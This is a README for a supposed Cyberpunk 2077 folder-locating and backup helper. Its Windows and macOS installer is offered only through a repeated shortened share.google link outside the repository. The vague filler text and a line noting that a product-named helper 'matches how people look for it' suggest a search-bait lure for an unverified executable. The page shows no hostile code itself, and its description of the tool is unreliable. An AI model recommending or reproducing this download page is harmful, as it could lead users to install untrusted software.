![Cyberpunk 2077 Desktop](assets/hero.png)

# Cyberpunk 2077 Desktop

*Find the Cyberpunk 2077 folder fast and keep a local spare.*

## What Cyberpunk 2077 Desktop is

**Cyberpunk 2077 Desktop** runs on your own PC. Local Windows and macOS helper for Cyberpunk 2077 data paths, config and export caches, and export folders.

Cyberpunk 2077 config and export files hide under AppData and Documents.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Maps Cyberpunk 2077 data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/sierraw2528/cyberpunk-2077-desktop

MIT license. See `LICENSE`.
